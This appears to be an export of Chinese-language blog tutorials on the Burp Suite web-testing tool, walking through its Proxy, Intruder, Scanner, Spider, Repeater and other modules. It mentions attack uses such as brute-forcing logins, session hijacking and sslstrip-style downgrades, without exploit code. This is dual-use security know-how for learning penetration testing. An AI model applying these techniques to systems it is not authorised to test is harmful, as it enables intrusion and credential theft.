    <content type="text"><![CDATA[引言BurpSuite系列之Comparer模块(比较器) 简介Burp Comparer在Burp Suite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别。使用中的场景可能是：1.枚举用户名过程中，对比分析登陆成功和失败时，服务器端反馈结果的区别。2.使用 Intruder 进行攻击时，对于不同的服务器端响应，可以很快的分析出两次响应的区别在哪里。3.进行SQL注入的盲注测试时，比较两次响应消息的差异，判断响应结果与注入条件的关联关系。 模块说明 对于Comparer的使用，主要有两个环节组成，先是数据加载，然后是差异分析。 Comparer数据加载的方式常用的有： 1.从其他Burp工具通过上下文菜单转发过来。2.直接粘贴。3.从文件加载三种方式。 当加载完毕后，如果你选择了两次不同的请求或应答消息，则下发的比较按钮将被激活，可以选择文本比较或者字节比较。 如果点击了【words】或者【bytes】，则进入比对界面，页面自动通过背景颜色显示数据的差异。 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列之decoder模块]]></title>
    <url>%2F2018%2F04%2F06%2FBurpSuite%E7%B3%BB%E5%88%97%E4%B9%8Bdecoder%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[引言BurpSuite系列之decoder模块(编码模块) 简介Burp Decoder是Burp Suite中一款编码解码工具，将原始数据转换成各种编码和哈希表的简单工具，它能够智能地识别多种编码格式采用启发式技术。 模块说明 通过有请求的任意模块的右键菜单send to Decoder或输入数据选择相应的数据格式即可进行解码编码操作，或直接点击Smart decoding进行智能解码。 更重要的是，对于同一个数据，我们可以在Decoder的界面，进行多次编码解码的转换。 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列之Repeater模块]]></title>
    <url>%2F2018%2F04%2F04%2FBurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BRepeater%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[引言BurpSuite系列之Repeater模块(中继器) 简介Burp Repeater 是一个手动修改并补发个别 HTTP 请求，并分析他们的响应的工具。它最大的用途就是和其他 Burp Suite 工具结合起来。你可以从目标站点地图，从 Burp Proxy 浏览记录，或者从 Burp Intruder 攻击结果上的请求，发送到 Repeater 上，并手动调整这个请求来微调对漏洞的探测或攻击。 模块说明1.可以从Proxy history、site map、Scanner等模块中右键菜单send to repeater发送到repeater，对页面数据进行修改发送。2.点击go，发送请求，右边响应请求。3.可以通过“&lt;“和”&gt;“来返回上一次和下一个操作。4.单击”x“可以删除当前测试请求页面。5.底部的功能用于搜索条件，可以用正则表达式，底部右边显示匹配结果数。raw — 这显示纯文本格式的消息。在文本面板的底部有一个搜索和加亮的功能，可以用来快速地定位出消息里的感兴趣的字符串，如出错消息。搜索栏左边的弹出项让你能控制状况的灵敏度，以及是否使用简单文本或者十六进制搜索。params — 对于包含参数(URL 查询字符串，cookie 头，或者消息体)的请求，这个选项把这些参数分析为名字/值的格式，这就可以简单地随他们进行查看和修改了。headers — 这里是以名字/值的格式来显示 HTTP 的消息头，并且也以原始格式显示了消息体。hex — 这里允许你直接编辑由原始二进制数据组成的消息。如果在文本编辑器修改，某种类型的传输(如，MIME 编码的浏览器请求)包含了可能损坏的二进制内容。为了修改这类消息，应该使用十六进制编辑器。该模块的设置在菜单栏 Repeater中，主要选项如下：介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列之Sequencer模块]]></title>
    <url>%2F2018%2F04%2F02%2FBurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BSequencer%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[引言BurpSuite系列之Sequencer模块(定序器) 简介Burp Sequencer是一种用于分析数据项的一个样本中的随机性质量的工具。你可以用它来测试应用程序的session tokens(会话tokens)或其他重要数据项的本意是不可预测的，比如反弹CSRF tokens，密码重置tokens等。 模块说明Burp Sequencer主要由三个模块组成: 1：Live capture 信息截取2：Manual load 手动加载3：Analysis options 选项分析 Live capture 信息截取选项1：Select Live Capture Request 选项2：Token Location Within Response 选项3：Live Capture Options Manual load 手动加载选项1：Manual Load Analysis options 选项分析选项1：Token Handling 令牌处理 选项2：Token Analysis 令牌分析 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Burpsuite系列之Intruder模块]]></title>
    <url>%2F2018%2F03%2F28%2FBurpsuite%E7%B3%BB%E5%88%97%E4%B9%8BIntruder%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[引言Burpsuite系列之Intruder模块（暴力破解） 一、简介Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。 二、模块说明Burp Intruder主要有四个模块组成: 1：Target 用于配置目标服务器进行攻击的详细信息。2：Positions 设置Payloads的插入点以及攻击类型（攻击模式）。3：Payloads 设置payload，配置字典4：Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 Target 目标选项(Target tab)这个选项是用来配置目标服务器的细节： Positions 位置选项(Positions tab)这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板：使用一对§字符来标记出有效负荷的位置，在这两个符号直接包含了模板文本的内容。当把一个有效负荷放置到一个给出的请求的特殊位置上时，就把这§符号放到这个位置，然后在两个符号之间的出现的文本都会被有效负荷替换。当有个特殊位置没有为一个给出的请求安排有效负荷时(这只适用”sniper”攻击类型)，那个位置的§字符会被删除，出现在它们之间的文本不会变化。 当使用 Burp Suite 发送一个其他地方的请求时，Burp Intruder 会对你最想放置有效负荷的位置做一个最好的猜测，并且它把这些放置在每个 URL 和主体参数的值里，以及每个cookie 里。每个标记和它中间的文本都会被加亮以显得更清晰。你可以使用 Intruder 菜单上的选项标记的位置是要替换还是附加现有的参数值。在上面的请求编辑器里，指出了定义位置的数量和文本模板的大小。你可以使用选项上的按钮来控制位置上的标记： add § — 在当前光标位置插入一个位置标记。clear § — 删除整个模板或选中的部分模板里的位置标记。auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞(SQL 注入)快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。refresh — 如果需要，可以刷新编辑器里有颜色的代码。clear — 删除整个编辑器内容。Payloads 有效负荷选项(Payloads tab)这个选项是用来配置一个或多个有效负荷的集合。如果定义了”cluster bomb”和”pitchfork”攻击类型，然后必须为每定义的有效负荷位置(最多8个)配置一个单独的有效负荷。使用”payload set”下拉菜单选择要配置的有效负荷。选项1：Payload Sets Payload数量类型设置选项2：Payload Opetions[Simple list] 该选项会根据选项1中Payload type的设置而改变 选项3：Payload Processing 对生成的Payload进行编码、加密、截取等操作 选项4：Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。 Opetions 选项卡(Options tab)此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。 如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。 如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。 如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。选项2：Request Engine 设置发送请求的线程、超时重试等。 选项3：Attack Results 设置攻击结果的显示。 选项4：Grep – Match 在响应中找出存在指定的内容的一项。 选项5：Grep – Extract 通过正则提取返回信息中的内容。 选项6：Grep – Payloads 这些设置可以用于包含已提交的有效负载的反射的标志结果项目。如果启用了此选项，BurpSuite会添加包含一个复选框指示当前负载的值在每个响应发现新的结果列。 选项7：Redirections 重定向响应，控制Burp在进行攻击时如何处理重定向。 Burp Suite Intruder的4种攻击类型Sniper（狙击手模式）狙击手模式使用一组payload集合，它一次只使用一个payload位置，假设你标记了两个位置“A”和“B”，payload值为“1”和“2”，那么它攻击会形成以下组合（除原始数据外）： Battering ram（攻城锤模式）攻城锤模式与狙击手模式类似的地方是，同样只使用一个payload集合，不同的地方在于每次攻击都是替换所有payload标记位置，而狙击手模式每次只能替换一个payload标记位置。 Pitchfork（草叉模式）草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，则攻击模式如下： Cluster bomb（集束炸弹模式）集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，还是上面的例子，如果用集束炸弹模式进行攻击，则除baseline请求外，会有四次请求： 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列之Scanner模块]]></title>
    <url>%2F2018%2F03%2F26%2FBurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BScanner%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[引言BurpSuite系列之Scanner模块(漏洞扫描) 一、简介Burp Scanner 是一个进行自动发现 web 应用程序的安全漏洞的工具。它是为渗透测试人员设计的，并且它和你现有的手动执行进行的 web 应用程序半自动渗透测试的技术方法很相似。使用的大多数的 web 扫描器都是单独运行的：你提供了一个开始 URL，单击‖go‖,然后注视着进度条的更新直到扫描结束，最后产生一个报告。Burp Scanner 和这完全不同，在攻击一个应用程序时它和你执行的操作紧紧的结合在一起。让你细微控制着每一个扫描的请求，并直接反馈回结果。Burp Scanner 可以执行两种扫描类型：主动扫描(Active scanning)，被动扫描(Passive scanning)。二、模块说明1：Issue activity 2：Scan queue 扫描队列，这里将显示扫描队列的状态 进度 结果等。 主要包含以下内容： 索引号的项目，反映该项目的添加顺序。 目的地协议，主机和URL 。 该项目的当前状态，包括完成百分比。 项目扫描问题的数量（这是根据所附的最严重问题的重要性和彩色化） 。 在扫描项目的请求数量进行。 网络错误的数目遇到的问题。 为项目创建的插入点的数量。 3：Live scanning实时扫描可让您决定哪些内容通过使用浏览器的目标应用，通过BurpProxy服务器进行扫描。您可以实时主动扫描设定live active scanning(积极扫描)和live passive（被动扫描）两种扫描模式。Live Active Scanning：积极扫描。当浏览时自动发送漏洞利用代码。 Live Passive Scanning：被动扫描。只分析流量不发送任何请求。 3：Issue Definitions漏洞列表，列出了burp可以扫描到的漏洞详情 4：Options包含Burp扫描选项进行攻击的插入点，主动扫描引擎，主动扫描优化，主动扫描区和被动扫描区域。1：Attack Insertion Points 2：Active Scanning Engine 3：Active Scanning Optimization 4：Active Scanning Areas 5：Passive Scanning Areas 6：Static Code Analysis 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite之Spider模块]]></title>
    <url>%2F2018%2F03%2F26%2FBurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BSpider%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[引言BurpSuite之Spider模块(蜘蛛爬行) 一、简介Burp Spider 是一个映射 web 应用程序的工具。它使用多种智能技术对一个应用程序的内容和功能进行全面的清查。Burp Spider 通过跟踪 HTML 和 JavaScript 以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及 robots.txt 文件。结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用程序视图。Burp Spider 能使你清楚地了解到一个 web 应用程序是怎样工作的，让你避免进行大量的手动任务而浪费时间，在跟踪链接，提交表单，精简 HTNL 源代码。可以快速地确人应用程序的潜在的脆弱功能，还允许你指定特定的漏洞，如 SQL 注入，路径遍历。二、模块介绍要对应用程序使用 Burp Spider 需要两个简单的步骤：1.使用 Burp Proxy 配置为你浏览器的代理服务器，浏览目标应用程序(为了节省时间，你可以关闭代理拦截)。 2.到站点地图的”arget”选项上，选中目标应用程序驻留的主机和目录。选择上下文菜单的”spider this host/branc”选项。 选项一、Contro用来开始和停止 Burp Spider，监视它的进度，以及定义 spidering 的范围。选项二、Options这个选项里包含了许多控制 Burp Spider 动作的选项。1：Crawler Settings● check robots.txt：检测robot.txt文件。选择后Burp Spider会要求和处理robots.txt文件，提取内容链接。● Detect custom “not found” responese：检测自定义的’not found’响应。打开后Burp Spider会从每个域请求不存在的资源，编制指纹与诊断“not found”响应其它请求检测自定义“not found”的响应。● ignore links to non-text content：忽略非文本内容的连接。这个选项被选中，Spider 不会请求非文本资源。使用这个选项，会减少 spidering 时间。● request the root of all directories：请求所有的根目录。如果这个选项被选中，Burp Spider 会请求所有已确认的目标范围内的 web 目录，如果在这个目标站点存在目录遍历， 这选项将是非常的有用。● make a non-parameterized request to each dynamic page：对每个动态页面进行非参数化的请求。如果这个选项被选中，Burp Spider 会对在范围内的所有执行动作的 URL 进行无参数的 GET 请求。如果期待的参数没有被接收， 动态页面会有不同的响应，这个选项就能成功地探测出额外的站点内容和功能。● Maximum link depth：这是Burp Suite在种子 URL 里的浏览”hops”的最大数。0表示让Burp Suite只请求种子 URL。如果指定的数值非常大，将会对范围内的链接进行无限期的有效跟踪。将此选项设置为一个合理的数字可以帮助防止循环Spider在某些种类的动态生成的内容。● Maximum parameterized requests per URL：请求该蜘蛛用不同的参数相同的基本URL的最大数目。将此选项设置为一个合理的数字可以帮助避免爬行“无限”的内容。2：Passive Spidering● Passively spider as you browse:如果这个选项被选中，Burp Suite 会被动地处理所有通过 Burp Proxy 的 HTTP 请求，来确认访问页面上的链接和表格。使用这个选项能让 Burp Spider 建立一个包含应用程序内容的详细画面，甚至此时你仅仅使用浏览器浏览了内容的一个子集，因为所有被访问内容链接到内容都会自动地添加到 Suite 的站点地图上。● link depth to associate with proxy requests:这个选项控制着与通过 Burp Proxy 访问的 web 页面 有关的” link depth”。为了防止 Burp Spider 跟踪这个页面里的所有链接，要设置一个比上面 选项卡里的” maximum link depth”值还高的一个值。3：Form Submission● individuate forms：个性化的形式。这个选项是配置个性化的标准(执行 URL，方法，区域，值)。当 Burp Spider 处理这些表格时，它会检查这些标准以确认表格是否是新的。旧的表格不会加入到提交序列。● Don’t submit：开启后蜘蛛不会提交任何表单。● prompt for guidance：提醒向导。如果被选中，在你提交每一个确认的表单前，Burp Suite 都会为你指示引导。这允许你根据需要在输入域中填写自定义的数据，以及选项提交到服务器的哪一个区域。● automatically submit：自动提交。如果选中，Burp Spider 通过使用定义的规则来填写输入域的文本值来自动地提交范围内的表单。每一条规则让你指定一个简单的文本或者正则表达式来匹配表单字段名，并提交那些表单名匹配的字段值。● set unmatched fields to：设置不匹配的字段。4：application login● don’t submit login forms：不提交登录表单。开启后burp不会提交登录表单。● prompt for guidance：提示向导。Burp能交互地为你提示引导。默认设置项。● handle as ordinary forms：以一般形式处理。Burp 通过你配置的信息和自动填充规则，用处理其他表单的方式来处理登陆表单。● automatically submit these credentials：自动提交自定义的数据。开启后burp遇到登录表单会按照设定的值进行提交。5：Spider Engine● Number of threads – 设置请求线程。控制并发请求数。● Number of retries on network failure – 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。● Pause before retry – 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。● Throttle between requests：在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。● Add random variations to throttle：添加随机的变化到请求中。增加隐蔽性。6：Request Headers您可以配置头蜘蛛在请求中使用的自定义列表。这可能是有用的，以满足各个应用程序的特定要求 – 例如，测试设计用于移动设备的应用程序时，以模拟预期的用户代理。 ● Use HTTP version 1.1 ：在蜘蛛请求中使用HTTP/1.1，不选中则使用HTTP/1.0.● Use Referer header：当从一个页面访问另一个页面是加入Referer头，这将更加相似与浏览器访问。 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列之Proxy模块]]></title>
    <url>%2F2018%2F03%2F01%2FBurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BProxy%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[BurpSuite系列之Proxy模块(代理模块) 简介Proxy代理模块作为BurpSuite的核心功能，拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。 Burp代理允许你通过监视和操纵应用程序传输的关键参数和其他数据来查找和探索应用程序的漏洞。通过以恶意的方式修改浏览器的请求，Burp 代理可以用来进行攻击，如：SQL 注入，cookie欺骗，提升权限，会话劫持，目录遍历，缓冲区溢出。拦截的传输可以被修改成原始文本，也可以是包含参数或者消息头的表格，也可以十六进制形式，甚至可以操纵二进制形式的数据。在 Burp 代理可以呈现出包含 HTML 或者图像数据的响应消息。 模块说明Intercept用于显示和修改HTTP请求和响应，通过你的浏览器和Web服务器之间。在BurpProxy的选项中，您可以配置拦截规则来确定请求是什么和响应被拦截(例如，范围内的项目，与特定文件扩展名，项目要求与参数，等)。该面板还包含以下控制： 消息类型显示的四种格式 raw：这里显示的是纯文本形式的消息。在文本窗口的底部提供了一个搜索和加亮功能，可以用它来快速地定位出消息中的感兴趣的字符串，如错误消息。在搜索的左边有一个弹出项，让你来处理大小写问题，以及是使用简单的文本搜索还是正则表达搜索。 params：对包含参数(URL 查询字符串，cookies 消息头，或消息体)的请求，这个选项可以把参数分析成名称/值的组合，并且允许你能简单地查看和修改。 headers：这里以名称/值的组合来显示 HTTP 的消息头，并且还以原始的形式显示消息体。 hex：这里允许你直接编辑消息的原始二进制数据。如果在文本编辑器里修改，某些传输类型(例如，使用 MIME 编码的浏览器请求的部分)包含的二进制数据可能被损坏。为了修改这些类型的消息，应使用十六进制。 Forward当你编辑信息之后，发送信息到服务器或浏览器 Drop当你不想要发送这次信息可以点击drop放弃这个拦截信息 Interceptionis on/off这个按钮用来切换和关闭所有拦截。如果按钮显示Interceptionis On，表示请求和响应将被拦截或自动转发根据配置的拦截规则配置代理选项。如果按钮显示Interception is off则显示拦截之后的所有信息将自动转发。 Action说明一个菜单可用的动作行为操作可以有哪些操作功能。 123456789Send to Spider 发送给蜘蛛Do an active scan 执行主动扫描Send to Intruder 发送到入侵者Send to Repeater 发送到中继器Send to Sequencer 发送到序列发生器Send to Comparer 发送到比较器Send to Decoder 发送到解码器Request in browser 在浏览器的请求Engagement tools 参与工具 1.Change request method 对所有的请求，经过把所有相关的请求参数适当地搬迁到这个请求里来，你就可以自动地把请求的方法在 POST 和 GET 中间切换。通过发送恶意的请求使用这个选项来快速测试应用程序的极限参数是多少。 2.Change body encoding 对于所有的请求，你可以在应用程序/X-WWW 格式的 URL 编码和多重表单/数据之间切换消息体的编码方式。 3.Copy URL 把当前的 URL 完整地复制到粘贴板上。 4.Cope as curl command 作为curl命令 5.Cope to file 这个功能允许你把选择一个文件，并把消息的内容复制到这个文件里。这个对二进制数据来说是很方便的，要是通过粘贴板来复制会带来一些问题。复制操作是在选择的文本上进行的，如果没有被选中的内容，则是针对整个消息了。 6.Pase form file 这个功能允许你选择一个文件，并把文件里的内容粘贴到消息里。这个对二进制数据来说是很方便的，要是通过粘贴板来复制会带来一些问题。粘贴操作会替换掉被选中的内容，如果没有内容被选中，则在光标位置插入这些内容。 7.Save item 这个功能让你指定一个文件，把选中的请求和响应以XML的格式保存到这个文件，这里面包括所有的元数据如：响应的长度，HTTP 的状态码以及 MIME 类型。 8.Don’t intercept requests 通过这些命令可以快速地添加拦截动作的规则来阻止拦截到的消息，这些消息和当前的消息有着相同的特征(如远程主机，资源类型，响应编码)。 9.Do intercept 仅对请求有效，这允许你可以对当请求和响应的进行强制拦截。 10.Convert seiection 这些功能让你能够以多种方案对选择的文本进行快速的编码和解码。11URL-encode as you type 如果这个选项被打开，你输入的像&amp;和=这样的符号会被等价的 URL编码代替。 Cut 剪切Copy 复制Paste 粘贴Message edit help 消息编辑帮助Proxy interception help 代理拦截帮助 HTTP History这个选项是来显示所有请求产生的细节，显示的有目标服务器和端口，HTTP 方法，URL，以及请求中是否包含参数或被人工修改，HTTP 的响应状态码，响应字节大小，响应的 MIME类型，请求资源的文件类型，HTML 页面的标题，是否使用 SSL，远程 IP 地址，服务器设置的 cookies，请求的时间。 双击某个请求即可打开详情,通过Previous/next可以快速切换请求，并且Action也可以将请求发送至其他模块。 可以通过最左边的列里的下拉菜单来加亮单个选项： 在历史记录表里，右击一个或多个选项，就会显示一个上下文菜单让你执行一些操作，包括修改目标范围，把这些选项发送到其他 Burp 工具，或者删除这些项： 12345678910111213141516171819202122Add to scope 添加范围Spide from here 蜘蛛从当前地址开始Do an active scan 执行主动扫描Do a passive scan 做被动扫描Send to Intruder 发送到入侵者Send to Repeater 发送到中继器Send to Sequencer 发送到序列生成器Send to Comparer(request) 发送到比较器（请求）Send to Comparer(response) 发送到比较器（响应）Show response in browser 在浏览器中显示响应Request in browser 浏览请求Engagement tools 接合工具Show new History windows 显示新的历史窗口Add comment 添加评论Highlight 高亮部分Delete item 删除项目Clear history 清除历史记录Copy URL 复制网址Copy as curl command 复制为curl命令Copy links 复制链接Save item 保存项目Proxy history help 代理历史帮助 还可以通过配置过滤器来确定哪些顶层的数据项显示在表格里。有效应用程序包含了大量的内容，如图像，CSS 等，这些有利于从视图上隐藏的。AJAX 应用程序产生大量相似的异步请求，你可能会想把他们从视图上过滤出来来查看一些感兴趣的项。在这个历史记录表的顶部有一个过滤栏。单击会有一个弹出窗口，让你来精准地配置显示哪些内容在表格里： WebSockets history这个选项主要用于记录WebSockets的数据包，是HTML5中最强大的通信功能，定义了一个全双工的通信信道，只需Web上的一个 Socket即可进行通信，能减少不必要的网络流量并降低网络延迟。 Options该选项主要用于设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等，其中有八大选项:Proxy Listeners、Intercept Client Requests、Intercept Server Responses、Intercept WebSockets Messages、Response Modification、Match and replace、SSL Pass Through、Miscellaneous Proxy Listeners 代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于BurpProxy的工作流的心脏。默认情况下，Burp默认监听12.0.0.1地址，端口8080。要使用这个监听器，你需要配置你的浏览器使用127.0.0.1:8080作为代理服务器。此默认监听器是必需的测试几乎所有的基于浏览器的所有Web应用程序。 1.add：添加一个新的代理地址。 1.binding：新建一个代理，bind to port-绑定端口号 ，bind to address -绑定ip地址 2.request hadning:这些设置包括选项来控制是否BurpSuite重定向通过此侦听器接收到的请求： 2.1.Redirect to host 如果配置了这个选项，Burp会在每次请求转发到指定的主机，而不必受限于览器所请求的目标。需要注意的是，如果你正使用该选项，则可能需要配置匹配/替换规则重写的主机中的请求，如果服务器中，您重定向请求预期，不同于由浏览器发送一个主机头。 2.2.Redirect to port 如果配置了这个选项，Burp会在每次请求转发到指定的端口，而不必受限于浏览 2.3.Force use of SSL 如果配置了这个选项，Burp会使用HTTPS在所有向外的连接，即使传入的请求中使用普通的HTTP。您可以使用此选项，在与SSL相关的响应修改选项结合，开展sslstrip般的攻击使用Burp，其中，强制执行HTTPS的应用程序可以降级为普通的HTTP的受害用户的流量在不知不觉中通过BurpProxy代理。 ![](12.png) 3.Certificate:这些设置控制呈现给客户端的SSL服务器的SSL证书。 3.1.Generate CA-signed per-host certificate-这是默认选项。安装后，BurpSuite创造了一个独特的自签名的证书颁发机构（CA）证书，并将此计算机上使用，每次BurpSuite运行。当你的浏览器发出SSL连接到指定的主机，Burp产生该主机，通过CA证书签名的SSL证书。您可以安装BurpSuite的CA证书作为在浏览器中受信任的根，从而使每个主机的证书被接受，没有任何警报。您还可以导出其他工具或Burp的其他实例使用CA证书。 3.2.Generate a CA-signed certificate with a specific hostname---||这类似于前面的选项;然而，Burp会产生一个单一的主机证书与每一个SSL连接使用，使用您指定的主机名。在进行无形的代理时，此选项有时是必要的，因为客户端没有发送连接请求，因此Burp不能确定SSL协议所需的主机名。你也可以安装BurpSuite的CA证书作为受信任的根。 3.3.Use a custom certificate---||-此选项使您可以加载一个特定的证书（在PKCS＃12格式）呈现给你的浏览器。如果应用程序使用它需要特定的服务器证书（例如一个给定序列号或证书链）的客户端应该使用这个选项。 ![](13.png) 2.edit：编辑选中的代理地址。 3.remove：删除选中代理地址。 Intercept Client Requests配置拦截规则，设置拦截的匹配规则。 当Intercept request based on the following rules为选中状态时，burpsuite会配置列表中的规则进行拦截或转发。 注意：如果该复选框未选中，那么即使Intercept is on也无法截取数据包。 规则可以通过Enabled列中的复选框选择开启或关闭。规则可以是域名， IP地址，协议， HTTP方法， URL，文件扩展名，参数，cookie，头/主体内容，状态代码，MIME类型， HTML页面标题等。规则按顺序处理，并且使用布尔运算符AND和OR组合。 Intercept Server Responses配置拦截规则，设置拦截的匹配规则，不过这个选项是基于服务端拦截，当选小的Intercept request based on the following rules为选中状态时，burpsuite会匹配响应包。 Intercept WebSockets MessagesResponse Modification Match and replace用于自动替换请求和响应通过代理的部分。对于每一个HTTP消息，已启用的匹配和替换规则依次执行，选择适用的规则进行匹配执行。规则可以分别被定义为请求和响应，对于消息头和身体，并且还特别为只请求的第一行。每个规则可以指定一个文字字符串或正则表达式来匹配，和一个字符串来替换它。对于邮件头，如果匹配条件，整个头和替换字符串匹配留空，然后头被删除。如果指定一个空的匹配表达式，然后替换字符串将被添加为一个新的头。有可协助常见任务的各种缺省规则 - 这些都是默认为禁用。 匹配多行区域。您可以使用标准的正则表达式语法来匹配邮件正文的多行区域。 SSL Pass Through Miscellaneous 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列之Target模块]]></title>
    <url>%2F2018%2F02%2F12%2FBurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BTarget%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[BurpSuite系列之Target模块 Target功能目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程。Target分为site map和scope两个选项卡。 选项一：Site MapSiteMap会在目标中以树形和表形式显示，并且还可以查看完整的请求和响应。树视图包含内容的分层表示，随着细分为地址，目录，文件和参数化请 求的URL 。您还可以扩大有趣的分支才能看到进一步的细节。如果您选择树的一个或多个部分，在所有子分支所选择的项目和项目都显示在表视图。 该表视图显示有关每个项目（URL ， HTTP状态代码，网页标题等）的关键细节。您可以根据任意列进行排序表（单击列标题来循环升序排序，降序排序，和未排序） 如果您在表中选择一个项目，请求和响应（如适用）该项目显示在请求/响应窗格。这包含了请求和响应的HTTP报文的编辑器，提供每封邮件的详细分析。 站点地图汇总所有的信息BurpSuite已经收集到的有关申请。这包括： 所有这一切都通过代理服务器直接请求的资源。已推断出通过分析响应代理请求的任何物品（前提是你没有禁用被动Spider）。内容使用Spider或内容发现功能查找。由用户手动添加的任何项目，从其它工具的输出。 这样看起来site map是不是很乱，则可以右击add to scope，然后点击Filter勾选Show only in-scope items，此时你再回头看Site map就只有百度一个地址了，这里filter可以过滤一些参数，show all显示全部，hide隐藏所有，如果勾选了表示不过滤。 选择之后就只剩下一个网址了 